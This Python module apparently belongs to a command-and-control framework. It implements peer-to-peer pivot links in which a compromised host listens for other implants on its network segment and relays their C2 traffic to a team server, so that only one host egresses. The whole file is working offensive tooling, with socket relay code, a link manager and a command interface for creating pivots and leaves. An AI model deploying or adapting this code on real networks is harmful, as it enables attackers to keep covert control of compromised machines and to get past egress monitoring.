"""P2P / Pivot links — allow implants to chain via TCP so only one host egresses.
A pivot implant acts as a relay: it connects back to the C2 server, accepts incoming
connections from other implants on the same segment, and forwards their traffic."""

import socket
import threading
import select
import time
from typing import Optional


class PivotNode:
    """A node in a P2P chain. Can act as either a pivot (relay) or a leaf endpoint.

    The pivot listens for incoming implant connections and forwards their C2 traffic
    to the team server. Leaves connect through the pivot to reach the team server.
    """

    def __init__(self, role: str = "pivot", team_host: str = "", team_port: int = 0,
                 listen_addr: str = "0.0.0.0", listen_port: int = 4444):
        self.role = role  # "pivot" or "leaf"
        self.team_host = team_host
        self.team_port = team_port
        self.listen_addr = listen_addr
        self.listen_port = listen_port
        self._running = False
        self._listener: Optional[socket.socket] = None
        self._upstream: Optional[socket.socket] = None
        self._downstreams: list[socket.socket] = []
        self._lock = threading.Lock()

    def start_pivot(self):
        """Start as a pivot: listen for downstream implants, connect upstream to team server."""
        self._running = True
        self.role = "pivot"

        # Connect upstream to the C2 team server
        self._upstream = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._upstream.connect((self.team_host, self.team_port))

        # Listen for downstream implants
        self._listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._listener.settimeout(1.0)
        self._listener.bind((self.listen_addr, self.listen_port))
        self._listener.listen(10)

        accept_thread = threading.Thread(target=self._accept_downstreams, daemon=True)
        accept_thread.start()

        relay_thread = threading.Thread(target=self._relay_loop, daemon=True)
        relay_thread.start()

    def connect_as_leaf(self, pivot_host: str, pivot_port: int):
        """Connect to an upstream pivot as a leaf node."""
        self._running = True
        self.role = "leaf"
        self._upstream = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._upstream.connect((pivot_host, pivot_port))

        relay_thread = threading.Thread(target=self._leaf_relay, daemon=True)
        relay_thread.start()

    def stop(self):
        self._running = False
        if self._listener:
            self._listener.close()
        if self._upstream:
            self._upstream.close()
        with self._lock:
            for ds in self._downstreams:
                ds.close()

    def _accept_downstreams(self):
        while self._running:
            try:
                client_sock, addr = self._listener.accept()
                with self._lock:
                    self._downstreams.append(client_sock)
            except socket.timeout:
                continue
            except OSError:
                break

    def _relay_loop(self):
        """Relay traffic between upstream (team server) and all downstreams."""
        while self._running:
            sockets = [self._upstream] + (self._downstreams if self._downstreams else [])
            try:
                readable, _, _ = select.select(sockets, [], [], 1.0)
            except (OSError, ValueError):
                continue

            for sock in readable:
                try:
                    data = sock.recv(4096)
                    if not data:
                        continue
                    if sock is self._upstream:
                        # Forward from team server to all downstreams
                        with self._lock:
                            for ds in self._downstreams:
                                try:
                                    ds.sendall(data)
                                except OSError:
                                    pass
                    else:
                        # Forward from downstream to upstream (team server)
                        try:
                            self._upstream.sendall(data)
                        except OSError:
                            pass
                except Exception:
                    continue

    def _leaf_relay(self):
        """Leaf relay: bidirectional between upstream pivot and local operator tool."""
        while self._running:
            try:
                readable, _, _ = select.select([self._upstream], [], [], 1.0)
                for sock in readable:
                    data = sock.recv(4096)
                    if not data:
                        self._running = False
                        break
                    # Process C2 data locally (for now just log)
            except (OSError, ValueError):
                break


class PivotLinkManager:
    """Manages P2P pivot chains from the C2 server's perspective."""

    def __init__(self):
        self._pivots: dict[str, PivotNode] = {}

    def create_pivot(self, name: str, team_host: str, team_port: int,
                     listen_port: int = 4444) -> str:
        if name in self._pivots:
            return f"Pivot '{name}' already exists"

        node = PivotNode(role="pivot", team_host=team_host, team_port=team_port,
                         listen_port=listen_port)
        node.start_pivot()
        self._pivots[name] = node
        return f"Pivot '{name}' started (team={team_host}:{team_port}, listen=:{listen_port})"

    def create_leaf(self, name: str, pivot_host: str, pivot_port: int) -> str:
        if name in self._pivots:
            return f"Link '{name}' already exists"

        node = PivotNode(role="leaf")
        node.connect_as_leaf(pivot_host, pivot_port)
        self._pivots[name] = node
        return f"Leaf '{name}' connected to {pivot_host}:{pivot_port}"

    def remove_link(self, name: str) -> str:
        node = self._pivots.pop(name, None)
        if node is None:
            return f"Link '{name}' not found"
        node.stop()
        return f"Link '{name}' removed"

    def list_links(self) -> str:
        if not self._pivots:
            return "No active pivot links"
        lines = []
        for name, node in self._pivots.items():
            role = node.role
            downstreams = len(node._downstreams) if node.role == "pivot" else 0
            lines.append(f"  {name}: role={role}, downstreams={downstreams}")
        return "\n".join(lines)


# Module-level singleton
_pivot_mgr = PivotLinkManager()


def run(args: list[str]) -> str:
    """Module entry point for P2P pivot management.

    Usage:
        p2p create_pivot <name> <team_host> <team_port> [listen_port:4444]
        p2p create_leaf <name> <pivot_host> <pivot_port>
        p2p remove <name>
        p2p list
    """
    if not args:
        return "Usage: p2p create_pivot|create_leaf|remove|list"

    cmd = args[0].lower()

    if cmd == "create_pivot":
        if len(args) < 4:
            return "Usage: p2p create_pivot <name> <team_host> <team_port> [listen_port:4444]"
        name = args[1]
        listen_port = int(args[4]) if len(args) > 4 else 4444
        return _pivot_mgr.create_pivot(name, args[2], int(args[3]), listen_port)

    elif cmd == "create_leaf":
        if len(args) < 4:
            return "Usage: p2p create_leaf <name> <pivot_host> <pivot_port>"
        return _pivot_mgr.create_leaf(args[1], args[2], int(args[3]))

    elif cmd == "remove":
        if len(args) < 2:
            return "Usage: p2p remove <name>"
        return _pivot_mgr.remove_link(args[1])

    elif cmd == "list":
        return _pivot_mgr.list_links()

    else:
        return f"Unknown command: {cmd}"
